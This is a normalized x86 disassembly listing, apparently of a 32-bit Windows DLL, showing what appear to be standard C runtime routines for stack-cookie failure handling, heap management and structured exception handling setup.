lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1001620b
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1001620b
pop ecx
sub_1001125d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_100112c5
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100112b2
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1001125d
pop ecx
mov esi eax
call sub_1001129f
mov [ eax ] esi
pop esi
pop ebp
retn
sub_100112e8
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_10011318
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_1001138c
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_10016222
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_100113d7
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1000fe7d
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_10011445
push 0xc
push r--data
call sub_10012000
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_100126aa
push 0x1e
call sub_100124ff
push 0xff
call sub_10012270
push 0x18
call sub_10013c4e
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_10011508
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1001129f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10012045
retn
push edi
call sub_1000fe7d
pop ecx
push 0xfa0
push edi
call sub_10016222
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1000fe7d
pop ecx
call sub_1001129f
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100114ff
mov eax [ ebp - 0x1c ]
sub_10011508
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10011445
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1001221c
pop ecx
sub_1001153b
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_1001156b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_10016290
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_10011881
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_10011931
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_10011a39
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_10011d1a
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_10011931
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_10011881
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_10012000
push sub_10012060
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10012060
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000fe6e
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
